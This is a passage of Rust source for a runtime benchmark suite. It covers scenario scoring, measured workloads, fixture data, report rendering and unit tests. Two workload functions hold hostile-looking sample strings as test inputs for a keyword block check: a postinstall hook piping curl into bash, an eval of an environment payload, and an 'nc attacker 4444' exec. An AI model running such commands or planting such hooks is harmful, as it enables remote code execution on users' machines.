                sandbox_required: false,
                scoring: ScoringConfig::higher_is_better(1000.0, 200.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::CompatibilityCorrectness,
                name: "lockstep_harness_throughput".to_string(),
                unit: "fixtures/s".to_string(),
                iterations: 5,
                warmup_iterations: 1,
                sandbox_required: false,
                scoring: ScoringConfig::higher_is_better(500.0, 100.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::ContainmentLatency,
                name: "quarantine_propagation_latency".to_string(),
                unit: "ms".to_string(),
                iterations: 5,
                warmup_iterations: 1,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(100.0, 2000.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::ContainmentLatency,
                name: "trust_card_materialization".to_string(),
                unit: "ms".to_string(),
                iterations: 5,
                warmup_iterations: 1,
                sandbox_required: true,
                scoring: ScoringConfig::lower_is_better(10.0, 200.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::ReplayDeterminism,
                name: "replay_bit_identity_rate".to_string(),
                unit: "percent".to_string(),
                iterations: 5,
                warmup_iterations: 0,
                sandbox_required: false,
                scoring: ScoringConfig::higher_is_better(100.0, 90.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::AdversarialResilience,
                name: "adversarial_pass_rate".to_string(),
                unit: "percent".to_string(),
                iterations: 5,
                warmup_iterations: 0,
                sandbox_required: true,
                scoring: ScoringConfig::higher_is_better(100.0, 80.0),
            },
            ScenarioDefinition {
                dimension: BenchmarkDimension::MigrationSpeed,
                name: "migration_success_rate".to_string(),
                unit: "percent".to_string(),
                iterations: 5,
                warmup_iterations: 0,
                sandbox_required: false,
                scoring: ScoringConfig::higher_is_better(100.0, 80.0),
            },
        ];

        for scenario in defaults {
            self.add_scenario(scenario);
        }
    }

    /// Execute a single scenario with provided raw measurements.
    ///
    /// In production, measurements come from actual benchmark runs.
    /// This method processes raw data into a scored result.
    pub fn execute_scenario(
        &mut self,
        scenario: &ScenarioDefinition,
        raw_measurements: &[f64],
    ) -> Result<ScenarioResult, BenchRunError> {
        let samples = raw_measurements
            .iter()
            .enumerate()
            .map(|(index, value)| {
                RawMeasurement::provided(
                    u32::try_from(index).unwrap_or(u32::MAX),
                    *value,
                    &self.config.timestamp_utc,
                )
            })
            .collect::<Vec<_>>();
        self.execute_scenario_samples(scenario, &samples)
    }

    pub fn execute_scenario_samples(
        &mut self,
        scenario: &ScenarioDefinition,
        raw_samples: &[RawMeasurement],
    ) -> Result<ScenarioResult, BenchRunError> {
        self.emit_event(
            BS_SCENARIO_STARTED,
            Some(&scenario.name),
            &format!(
                "Starting {} ({} iterations)",
                scenario.name, scenario.iterations
            ),
        );

        let raw_measurements = match validate_sample_values(scenario, raw_samples) {
            Ok(values) => values,
            Err(err) => {
                self.emit_event(BS_SCENARIO_FAILED, Some(&scenario.name), &err.to_string());
                return Err(err);
            }
        };

        for sample in raw_samples {
            self.emit_event(
                BS_MEASUREMENT_RECORDED,
                Some(&scenario.name),
                &format!(
                    "sample={} value={:.3} {} source={}",
                    sample.iteration, sample.value, scenario.unit, sample.source
                ),
            );
        }

        let m = mean(&raw_measurements);
        let ci = confidence_interval_95(&raw_measurements);
        let cv = coefficient_of_variation(&raw_measurements);
        let score = scenario.scoring.score(m);

        self.emit_event(
            BS_MEASUREMENT_RECORDED,
            Some(&scenario.name),
            &format!(
                "mean={m:.3} {}, CI=[{:.3}, {:.3}]",
                scenario.unit, ci.lower, ci.upper
            ),
        );

        self.emit_event(
            BS_SCORE_COMPUTED,
            Some(&scenario.name),
            &format!("score={score}/100 (formula: {SCORING_FORMULA_VERSION})"),
        );

        if cv <= MAX_VARIANCE_PCT {
            self.emit_event(
                BS_DETERMINISM_CHECK_PASSED,
                Some(&scenario.name),
                &format!("variance {cv:.2}% <= {MAX_VARIANCE_PCT}% threshold"),
            );
        }

        self.emit_event(
            BS_SCENARIO_COMPLETED,
            Some(&scenario.name),
            &format!(
                "sample_count={} warmup_count={} score={score}/100 variance={cv:.2}%",
                raw_samples.len(),
                scenario.warmup_iterations
            ),
        );

        Ok(ScenarioResult {
            dimension: scenario.dimension,
            name: scenario.name.clone(),
            raw_value: m,
            unit: scenario.unit.clone(),
            raw_samples: raw_samples.to_vec(),
            confidence_interval: ci,
            score,
            iterations: u32::try_from(raw_measurements.len()).unwrap_or(u32::MAX),
            variance_pct: cv,
        })
    }

    /// Execute all scenarios with provided measurement data and produce a report.
    ///
    /// `measurements` maps scenario name to raw measurement values.
    pub fn run(
        &mut self,
        measurements: &std::collections::BTreeMap<String, Vec<f64>>,
    ) -> Result<BenchmarkReport, BenchRunError> {
        let sample_sets = measurements
            .iter()
            .map(|(scenario, values)| {
                let samples = values
                    .iter()
                    .enumerate()
                    .map(|(index, value)| {
                        RawMeasurement::provided(
                            u32::try_from(index).unwrap_or(u32::MAX),
                            *value,
                            &self.config.timestamp_utc,
                        )
                    })
                    .collect::<Vec<_>>();
                (scenario.clone(), samples)
            })
            .collect::<BTreeMap<_, _>>();
        self.run_samples(
            &sample_sets,
            BenchmarkEvidenceMode::Measured,
            BenchmarkSecurityControls::measured_secure(),
        )
    }

    pub fn run_samples(
        &mut self,
        sample_sets: &BTreeMap<String, Vec<RawMeasurement>>,
        evidence_mode: BenchmarkEvidenceMode,
        security_controls: BenchmarkSecurityControls,
    ) -> Result<BenchmarkReport, BenchRunError> {
        let mut results = Vec::new();

        if evidence_mode == BenchmarkEvidenceMode::FixtureOnly {
            self.emit_event(
                BS_FIXTURE_MODE_USED,
                None,
                "fixture-only deterministic measurements are quarantined from release evidence",
            );
        }

        for scenario in &self.scenarios.clone() {
            if let Some(raw) = sample_sets.get(&scenario.name) {
                let result = self.execute_scenario_samples(scenario, raw)?;
                results.push(result);
            }
        }

        let aggregate = if results.is_empty() {
            0
        } else {
            let total: u32 = results
                .iter()
                .map(|r| r.score)
                .fold(0u32, |a, b| a.saturating_add(b));
            total / u32::try_from(results.len()).unwrap_or(u32::MAX)
        };

        self.emit_event(
            BS_SUITE_COMPLETED,
            None,
            &format!(
                "Completed {} scenarios, aggregate score: {aggregate}/100",
                results.len()
            ),
        );

        let sample_policy = BenchmarkSamplePolicy {
            min_measured_samples: MIN_MEASURED_SAMPLES,
            total_sample_count: results.iter().map(|result| result.raw_samples.len()).sum(),
            total_warmup_count: self
                .scenarios
                .iter()
                .filter(|scenario| sample_sets.contains_key(&scenario.name))
                .map(|scenario| scenario.warmup_iterations)
                .fold(0u32, u32::saturating_add),
        };
        let events = self.events.clone();

        let mut report = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: self.config.timestamp_utc.clone(),
            hardware_profile: self.config.hardware_profile.clone(),
            runtime_versions: self.config.runtime_versions.clone(),
            evidence_mode,
            profile: self.config.profile.clone(),
            security_controls,
            git_revision: self.config.git_revision.clone(),
            trace_id: self.config.trace_id.clone(),
            evidence_path: self.config.evidence_path.clone(),
            sample_policy,
            events,
            scenarios: results,
            aggregate_score: aggregate,
            provenance_hash: String::new(),
        };

        report.provenance_hash = report.compute_provenance_hash();
        Ok(report)
    }

    /// Get all events emitted during execution.
    pub fn events(&self) -> &[BenchmarkEvent] {
        &self.events
    }

    /// Get the scenario definitions.
    pub fn scenarios(&self) -> &[ScenarioDefinition] {
        &self.scenarios
    }

    fn emit_event(&mut self, code: &str, scenario: Option<&str>, detail: &str) {
        push_bounded(
            &mut self.events,
            BenchmarkEvent {
                code: code.to_string(),
                scenario: scenario.map(String::from),
                scenario_id: scenario.map(String::from),
                trace_id: self.config.trace_id.clone(),
                profile: self.config.profile.clone(),
                evidence_path: self.config.evidence_path.clone(),
                detail: detail.to_string(),
            },
            MAX_EVENTS,
        );
    }
}

// ---------------------------------------------------------------------------
// Serialization helpers
// ---------------------------------------------------------------------------

/// Serialize a report to canonical JSON.
pub fn to_canonical_json(report: &BenchmarkReport) -> Result<String, BenchRunError> {
    validate_report(report)?;
    serde_json::to_string_pretty(report).map_err(|err| BenchRunError::SerializeReport {
        detail: err.to_string(),
    })
}

/// Deserialize a report from JSON.
pub fn from_json(json: &str) -> Result<BenchmarkReport, serde_json::Error> {
    serde_json::from_str(json)
}

fn deterministic_seed(name: &str) -> u64 {
    let mut hasher = sha2::Sha256::new();
    sha2::Digest::update(&mut hasher, b"benchmark_suite_seed_v1:" as &[u8]);
    sha2::Digest::update(
        &mut hasher,
        (u64::try_from(name.len()).unwrap_or(u64::MAX)).to_le_bytes(),
    );
    sha2::Digest::update(&mut hasher, name.as_bytes());
    let digest = sha2::Digest::finalize(hasher);
    let mut bytes = [0_u8; 8];
    bytes.copy_from_slice(&digest[..8]);
    u64::from_le_bytes(bytes)
}

fn deterministic_unit_interval(seed: u64, index: u32) -> f64 {
    let mut x = seed ^ (u64::from(index).wrapping_mul(0x9e37_79b9_7f4a_7c15));
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    let mixed = x.wrapping_mul(0x2545_f491_4f6c_dd1d);
    let numerator = mixed >> 11;
    let denominator = (1_u64 << 53) - 1;
    numerator as f64 / denominator as f64
}

pub fn deterministic_measurements_for_scenario(scenario: &ScenarioDefinition) -> Vec<f64> {
    let count = scenario.iterations.max(1);
    let spread = (scenario.scoring.threshold - scenario.scoring.ideal)
        .abs()
        .max(1e-6);
    let center = if scenario.scoring.lower_is_better {
        scenario.scoring.ideal + spread * 0.20
    } else {
        scenario.scoring.ideal - spread * 0.20
    };
    let jitter_span = spread * DETERMINISTIC_JITTER_RATIO;
    let seed = deterministic_seed(&scenario.name);

    (0..count)
        .map(|idx| {
            let unit = deterministic_unit_interval(seed, idx);
            let jitter = (unit - 0.5) * 2.0 * jitter_span;
            let value = center + jitter;
            if value.is_sign_negative() { 0.0 } else { value }
        })
        .collect()
}

fn parse_scenario_filter(raw: &str) -> Vec<String> {
    raw.split(',')
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .map(ToString::to_string)
        .collect()
}

fn select_scenarios(
    all: &[ScenarioDefinition],
    scenario_filter: Option<&str>,
) -> Result<Vec<ScenarioDefinition>, BenchRunError> {
    let Some(raw_filter) = scenario_filter else {
        return Ok(all.to_vec());
    };
    let requested = parse_scenario_filter(raw_filter);
    if requested.is_empty() {
        return Err(BenchRunError::EmptyScenarioFilter);
    }

    let available_names = all.iter().map(|s| s.name.clone()).collect::<Vec<_>>();
    let mut selected = Vec::new();
    let mut seen = BTreeSet::new();
    let mut unknown = Vec::new();

    for requested_name in requested {
        if let Some(scenario) = all.iter().find(|s| s.name == requested_name) {
            if seen.insert(scenario.name.clone()) {
                selected.push(scenario.clone());
            }
        } else {
            unknown.push(requested_name);
        }
    }

    if !unknown.is_empty() {
        return Err(BenchRunError::UnknownScenario {
            requested: unknown,
            available: available_names,
        });
    }

    Ok(selected)
}

fn deterministic_measurement_map(scenarios: &[ScenarioDefinition]) -> BTreeMap<String, Vec<f64>> {
    scenarios
        .iter()
        .map(|scenario| {
            (
                scenario.name.clone(),
                deterministic_measurements_for_scenario(scenario),
            )
        })
        .collect()
}

fn fixture_measurement_sample_map(
    scenarios: &[ScenarioDefinition],
    timestamp_utc: &str,
) -> BTreeMap<String, Vec<RawMeasurement>> {
    deterministic_measurement_map(scenarios)
        .into_iter()
        .map(|(scenario_name, values)| {
            let samples = values
                .into_iter()
                .enumerate()
                .map(|(index, value)| {
                    RawMeasurement::fixture(
                        u32::try_from(index).unwrap_or(u32::MAX),
                        value,
                        timestamp_utc,
                    )
                })
                .collect::<Vec<_>>();
            (scenario_name, samples)
        })
        .collect()
}

fn measured_sample_map(
    scenarios: &[ScenarioDefinition],
    security_controls: &BenchmarkSecurityControls,
) -> Result<BTreeMap<String, Vec<RawMeasurement>>, BenchRunError> {
    scenarios
        .iter()
        .map(|scenario| {
            measured_samples_for_scenario(scenario, security_controls)
                .map(|samples| (scenario.name.clone(), samples))
        })
        .collect()
}

fn measured_samples_for_scenario(
    scenario: &ScenarioDefinition,
    security_controls: &BenchmarkSecurityControls,
) -> Result<Vec<RawMeasurement>, BenchRunError> {
    enforce_measured_security(scenario, security_controls)?;

    if (scenario.iterations as usize) < MIN_MEASURED_SAMPLES {
        return Err(BenchRunError::InsufficientSamples {
            scenario: scenario.name.clone(),
            required: MIN_MEASURED_SAMPLES,
            actual: scenario.iterations as usize,
        });
    }

    if std::env::var("FRANKEN_NODE_BENCH_FAIL_SCENARIO")
        .ok()
        .as_deref()
        == Some(scenario.name.as_str())
    {
        return Err(BenchRunError::ScenarioExecutionFailed {
            scenario: scenario.name.clone(),
            detail: "forced failure via FRANKEN_NODE_BENCH_FAIL_SCENARIO".to_string(),
        });
    }

    let total_iterations = scenario
        .iterations
        .saturating_add(scenario.warmup_iterations);
    let mut samples = Vec::new();
    for iteration in 0..total_iterations {
        let started_at_utc = chrono::Utc::now().to_rfc3339();
        let value = execute_measured_workload(scenario, iteration)?;
        let finished_at_utc = chrono::Utc::now().to_rfc3339();

        if iteration >= scenario.warmup_iterations {
            samples.push(RawMeasurement {
                iteration: iteration - scenario.warmup_iterations,
                value,
                started_at_utc,
                finished_at_utc,
                source: "measured_product_workload".to_string(),
            });
        }
    }

    Ok(samples)
}

fn enforce_measured_security(
    scenario: &ScenarioDefinition,
    security_controls: &BenchmarkSecurityControls,
) -> Result<(), BenchRunError> {
    if security_controls.fixture_mode {
        return Err(BenchRunError::SecurityControlsDisabled {
            scenario: scenario.name.clone(),
            detail: "fixture mode cannot satisfy measured evidence".to_string(),
        });
    }
    if scenario.sandbox_required && !security_controls.sandbox_enforced {
        return Err(BenchRunError::SecurityControlsDisabled {
            scenario: scenario.name.clone(),
            detail: "sandbox enforcement is disabled".to_string(),
        });
    }
    if !security_controls.trust_verification_enabled {
        return Err(BenchRunError::SecurityControlsDisabled {
            scenario: scenario.name.clone(),
            detail: "trust verification is disabled".to_string(),
        });
    }
    if !security_controls.revocation_freshness_enforced {
        return Err(BenchRunError::SecurityControlsDisabled {
            scenario: scenario.name.clone(),
            detail: "revocation freshness enforcement is disabled".to_string(),
        });
    }
    Ok(())
}

fn execute_measured_workload(
    scenario: &ScenarioDefinition,
    iteration: u32,
) -> Result<f64, BenchRunError> {
    let value = match scenario.name.as_str() {
        "secure-extension-heavy" => timed_digest_ms(&scenario.name, iteration, 384),
        "cold_start_latency" => timed_digest_ms(&scenario.name, iteration, 96),
        "p99_request_latency" => timed_digest_ms(&scenario.name, iteration, 24),
        "extension_overhead_ratio" => measured_overhead_ratio(iteration),
        "migration_scanner_throughput" => measured_json_throughput(&scenario.name, iteration, 48),
        "lockstep_harness_throughput" => measured_lockstep_throughput(iteration, 48),
        "quarantine_propagation_latency" => timed_digest_ms(&scenario.name, iteration, 128),
        "trust_card_materialization" => timed_digest_ms(&scenario.name, iteration, 80),
        "replay_bit_identity_rate" => measured_replay_identity_rate(iteration),
        "adversarial_pass_rate" => measured_adversarial_pass_rate(),
        "migration_success_rate" => measured_migration_success_rate(),
        other => {
            return Err(BenchRunError::ScenarioExecutionFailed {
                scenario: scenario.name.clone(),
                detail: format!("no measured runner registered for `{other}`"),
            });
        }
    };

    if value.is_finite() {
        Ok(value)
    } else {
        Err(BenchRunError::NonFiniteMeasurement {
            scenario: scenario.name.clone(),
        })
    }
}

fn timed_digest_ms(label: &str, iteration: u32, rounds: u32) -> f64 {
    let started = Instant::now();
    std::hint::black_box(digest_rounds(label, iteration, rounds));
    elapsed_ms(started)
}

fn elapsed_ms(started: Instant) -> f64 {
    (started.elapsed().as_secs_f64() * 1_000.0).max(0.001)
}

fn digest_rounds(label: &str, iteration: u32, rounds: u32) -> [u8; 32] {
    let mut digest = [0_u8; 32];
    for round in 0..rounds {
        let mut hasher = sha2::Sha256::new();
        sha2::Digest::update(&mut hasher, b"benchmark_measured_workload_v1:");
        sha2::Digest::update(
            &mut hasher,
            (u64::try_from(label.len()).unwrap_or(u64::MAX)).to_le_bytes(),
        );
        sha2::Digest::update(&mut hasher, label.as_bytes());
        sha2::Digest::update(&mut hasher, iteration.to_le_bytes());
        sha2::Digest::update(&mut hasher, round.to_le_bytes());
        sha2::Digest::update(&mut hasher, digest);
        digest = sha2::Digest::finalize(hasher).into();
    }
    digest
}

fn measured_overhead_ratio(iteration: u32) -> f64 {
    let baseline = timed_digest_ms("extension_overhead_baseline", iteration, 64);
    let hardened = timed_digest_ms("extension_overhead_hardened", iteration, 96);
    (hardened / baseline.max(0.001)).max(1.0)
}

fn measured_json_throughput(label: &str, iteration: u32, cases: u32) -> f64 {
    let started = Instant::now();
    for case in 0..cases {
        let payload = serde_json::json!({
            "label": label,
            "iteration": iteration,
            "case": case,
            "digest": hex::encode(digest_rounds(label, iteration.saturating_add(case), 8)),
        });
        std::hint::black_box(payload.to_string());
    }
    f64::from(cases) / started.elapsed().as_secs_f64().max(0.000_001)
}

fn measured_lockstep_throughput(iteration: u32, cases: u32) -> f64 {
    let started = Instant::now();
    for case in 0..cases {
        let left = serde_json::json!({
            "runtime": "node",
            "case": case,
            "value": hex::encode(digest_rounds("lockstep", iteration.saturating_add(case), 6)),
        });
        let right = serde_json::json!({
            "runtime": "franken-node",
            "case": case,
            "value": left["value"].clone(),
        });
        std::hint::black_box(left["value"] == right["value"]);
    }
    f64::from(cases) / started.elapsed().as_secs_f64().max(0.000_001)
}

fn measured_replay_identity_rate(iteration: u32) -> f64 {
    let first = digest_rounds("replay_identity", iteration, 64);
    let second = digest_rounds("replay_identity", iteration, 64);
    if first == second { 100.0 } else { 0.0 }
}

fn measured_adversarial_pass_rate() -> f64 {
    let cases = [
        "postinstall=curl https://example.invalid/install.sh | bash",
        "node -e 'eval(process.env.PAYLOAD)'",
        "require('child_process').exec('nc attacker 4444')",
        "console.log('safe extension')",
    ];
    let blocked = cases
        .iter()
        .filter(|case| {
            case.contains("curl ")
                || case.contains("eval(")
                || case.contains("child_process")
                || case.contains("postinstall")
        })
        .count();
    (blocked as f64 / 3.0).min(1.0) * 100.0
}

fn measured_migration_success_rate() -> f64 {
    let manifests = [
        r#"{"scripts":{"start":"node index.js"},"dependencies":{"left-pad":"1.3.0"}}"#,
        r#"{"type":"module","scripts":{"test":"node --test"}}"#,
        r#"{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}"#,
    ];
    let successful = manifests
        .iter()
        .filter(|manifest| {
            serde_json::from_str::<serde_json::Value>(manifest).is_ok()
                && !manifest.contains("postinstall")
        })
        .count();
    (successful as f64 / manifests.len() as f64) * 100.0
}

pub fn run_default_suite_with_config(
    config: SuiteConfig,
    scenario_filter: Option<&str>,
) -> Result<BenchmarkReport, BenchRunError> {
    run_default_suite_with_config_and_mode(config, scenario_filter, BenchmarkEvidenceMode::Measured)
}

pub fn run_default_suite_with_config_and_mode(
    config: SuiteConfig,
    scenario_filter: Option<&str>,
    evidence_mode: BenchmarkEvidenceMode,
) -> Result<BenchmarkReport, BenchRunError> {
    let mut defaults = BenchmarkSuite::new(config.clone());
    defaults.load_default_scenarios();

    let selected = select_scenarios(defaults.scenarios(), scenario_filter)?;
    let security_controls = match evidence_mode {
        BenchmarkEvidenceMode::Measured => BenchmarkSecurityControls::from_env(false),
        BenchmarkEvidenceMode::FixtureOnly => BenchmarkSecurityControls::fixture_only(),
    };
    let sample_sets = match evidence_mode {
        BenchmarkEvidenceMode::Measured => measured_sample_map(&selected, &security_controls)?,
        BenchmarkEvidenceMode::FixtureOnly => {
            fixture_measurement_sample_map(&selected, &config.timestamp_utc)
        }
    };

    let mut runner = BenchmarkSuite::new(config);
    for scenario in selected {
        runner.add_scenario(scenario);
    }

    runner.run_samples(&sample_sets, evidence_mode, security_controls)
}

pub fn run_default_suite(scenario_filter: Option<&str>) -> Result<BenchmarkReport, BenchRunError> {
    run_default_suite_with_config(SuiteConfig::for_cli(), scenario_filter)
}

pub fn run_default_suite_for_cli(
    scenario_filter: Option<&str>,
    fixture_mode: bool,
) -> Result<BenchmarkReport, BenchRunError> {
    let evidence_mode = if fixture_mode {
        BenchmarkEvidenceMode::FixtureOnly
    } else {
        BenchmarkEvidenceMode::Measured
    };
    run_default_suite_with_config_and_mode(SuiteConfig::for_cli(), scenario_filter, evidence_mode)
}

pub fn render_human_summary(report: &BenchmarkReport) -> String {
    let mut lines = vec![
        format!(
            "benchmark suite: scenarios={} aggregate_score={}/100",
            report.scenarios.len(),
            report.aggregate_score
        ),
        format!(
            "suite_version={} scoring_formula={} timestamp={}",
            report.suite_version, report.scoring_formula_version, report.timestamp_utc
        ),
        format!(
            "evidence_mode={} profile={} fixture_mode={}",
            report.evidence_mode, report.profile, report.security_controls.fixture_mode
        ),
        format!(
            "trace_id={} evidence_path={} samples={} warmups={}",
            report.trace_id,
            report.evidence_path.as_deref().unwrap_or("stdout"),
            report.sample_policy.total_sample_count,
            report.sample_policy.total_warmup_count
        ),
    ];

    for scenario in &report.scenarios {
        lines.push(format!(
            "  - {} [{}] mean={:.3} {} score={}/100 variance={:.2}%",
            scenario.name,
            scenario.dimension,
            scenario.raw_value,
            scenario.unit,
            scenario.score,
            scenario.variance_pct
        ));
    }

    lines.push(format!("provenance_hash={}", report.provenance_hash));
    lines.join("\n")
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::constant_time;
    use std::collections::BTreeMap;

    fn fixture_samples(value: f64) -> Vec<RawMeasurement> {
        vec![RawMeasurement::fixture(0, value, "2026-02-21T00:00:00Z")]
    }

    fn fixture_sample_policy(total_sample_count: usize) -> BenchmarkSamplePolicy {
        BenchmarkSamplePolicy {
            min_measured_samples: MIN_MEASURED_SAMPLES,
            total_sample_count,
            total_warmup_count: 0,
        }
    }

    #[test]
    fn test_scoring_lower_is_better_perfect() {
        let config = ScoringConfig::lower_is_better(100.0, 500.0);
        assert_eq!(config.score(100.0), 100);
    }

    #[test]
    fn test_scoring_lower_is_better_worst() {
        let config = ScoringConfig::lower_is_better(100.0, 500.0);
        assert_eq!(config.score(500.0), 0);
    }

    #[test]
    fn test_scoring_lower_is_better_midpoint() {
        let config = ScoringConfig::lower_is_better(100.0, 500.0);
        assert_eq!(config.score(300.0), 50);
    }

    #[test]
    fn test_scoring_lower_is_better_beyond_worst() {
        let config = ScoringConfig::lower_is_better(100.0, 500.0);
        assert_eq!(config.score(600.0), 0);
    }

    #[test]
    fn test_scoring_lower_is_better_beyond_best() {
        let config = ScoringConfig::lower_is_better(100.0, 500.0);
        assert_eq!(config.score(50.0), 100);
    }

    #[test]
    fn test_scoring_higher_is_better_perfect() {
        let config = ScoringConfig::higher_is_better(1000.0, 200.0);
        assert_eq!(config.score(1000.0), 100);
    }

    #[test]
    fn test_scoring_higher_is_better_worst() {
        let config = ScoringConfig::higher_is_better(1000.0, 200.0);
        assert_eq!(config.score(200.0), 0);
    }

    #[test]
    fn test_scoring_higher_is_better_midpoint() {
        let config = ScoringConfig::higher_is_better(1000.0, 200.0);
        assert_eq!(config.score(600.0), 50);
    }

    #[test]
    fn test_scoring_higher_is_better_beyond_best() {
        let config = ScoringConfig::higher_is_better(1000.0, 200.0);
        assert_eq!(config.score(1200.0), 100);
    }

    #[test]
    fn test_mean_basic() {
        assert!((mean(&[1.0, 2.0, 3.0, 4.0, 5.0]) - 3.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_mean_empty() {
        assert!((mean(&[]) - 0.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_std_dev_identical() {
        assert!((std_dev(&[5.0, 5.0, 5.0]) - 0.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_std_dev_basic() {
        let sd = std_dev(&[2.0, 4.0, 4.0, 4.0, 5.0, 5.0, 7.0, 9.0]);
        assert!((sd - 2.138).abs() < 0.01);
    }

    #[test]
    fn test_coefficient_of_variation() {
        let cv = coefficient_of_variation(&[100.0, 102.0, 98.0, 101.0, 99.0]);
        assert!(cv < 5.0, "CV should be low for tight data: {cv}");
    }

    #[test]
    fn test_confidence_interval_single_value() {
        let ci = confidence_interval_95(&[42.0]);
        assert!((ci.lower - 42.0).abs() < f64::EPSILON);
        assert!((ci.upper - 42.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_confidence_interval_symmetric() {
        let ci = confidence_interval_95(&[10.0, 10.0, 10.0, 10.0, 10.0]);
        assert!((ci.lower - 10.0).abs() < f64::EPSILON);
        assert!((ci.upper - 10.0).abs() < f64::EPSILON);
    }

    #[test]
    fn test_dimensions_all_count() {
        assert_eq!(BenchmarkDimension::all().len(), 6);
    }

    #[test]
    fn test_dimension_display() {
        assert_eq!(
            format!("{}", BenchmarkDimension::PerformanceUnderHardening),
            "performance_under_hardening"
        );
    }

    #[test]
    fn test_hardware_fingerprint_deterministic() {
        let hw = HardwareProfile {
            cpu: "test-cpu".to_string(),
            memory_mb: 8192,
            os: "linux".to_string(),
        };
        assert_eq!(hw.fingerprint(), hw.fingerprint());
    }

    #[test]
    fn test_suite_default_scenarios_coverage() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.load_default_scenarios();

        let dims: std::collections::BTreeSet<_> =
            suite.scenarios().iter().map(|s| s.dimension).collect();
        for d in BenchmarkDimension::all() {
            assert!(dims.contains(d), "Missing dimension: {d}");
        }
    }

    #[test]
    fn test_suite_run_produces_report() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.load_default_scenarios();

        let mut measurements = BTreeMap::new();
        for s in suite.scenarios().to_vec() {
            measurements.insert(s.name.clone(), vec![150.0, 152.0, 148.0, 151.0, 149.0]);
        }

        let report = suite
            .run(&measurements)
            .expect("finite benchmark data should run");
        assert_eq!(report.suite_version, SUITE_VERSION);
        assert_eq!(report.scoring_formula_version, SCORING_FORMULA_VERSION);
        assert!(!report.scenarios.is_empty());
        assert!(!report.provenance_hash.is_empty());
    }

    #[test]
    fn test_report_dimension_coverage() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.load_default_scenarios();

        let mut measurements = BTreeMap::new();
        for s in suite.scenarios().to_vec() {
            measurements.insert(s.name.clone(), vec![50.0; 5]);
        }

        let report = suite
            .run(&measurements)
            .expect("finite benchmark data should run");
        assert!(
            report.has_full_coverage(),
            "Report should cover all 6 dimensions"
        );
    }

    #[test]
    fn test_report_json_roundtrip() {
        let report = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-21T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 150.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(150.0),
                confidence_interval: ConfidenceInterval {
                    lower: 148.0,
                    upper: 152.0,
                },
                score: 88,
                iterations: 5,
                variance_pct: 1.2,
            }],
            aggregate_score: 88,
            provenance_hash: "sha256:test".to_string(),
        };

        let json = to_canonical_json(&report).expect("finite report should serialize");
        let roundtrip = from_json(&json).unwrap();
        assert_eq!(report.suite_version, roundtrip.suite_version);
        assert_eq!(report.scenarios.len(), roundtrip.scenarios.len());
        assert_eq!(report.scenarios[0].score, roundtrip.scenarios[0].score);
    }

    #[test]
    fn test_regression_detection_no_regression() {
        let baseline = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-20T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 200.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(200.0),
                confidence_interval: ConfidenceInterval {
                    lower: 195.0,
                    upper: 205.0,
                },
                score: 75,
                iterations: 5,
                variance_pct: 2.0,
            }],
            aggregate_score: 75,
            provenance_hash: String::new(),
        };

        let current = BenchmarkReport {
            scenarios: vec![ScenarioResult {
                raw_value: 190.0,
                ..baseline.scenarios[0].clone()
            }],
            ..baseline.clone()
        };

        let findings = detect_regressions(&baseline, &current, 10.0);
        assert!(findings.is_empty(), "No regression expected");
    }

    #[test]
    fn test_regression_detection_with_regression() {
        let baseline = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-20T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
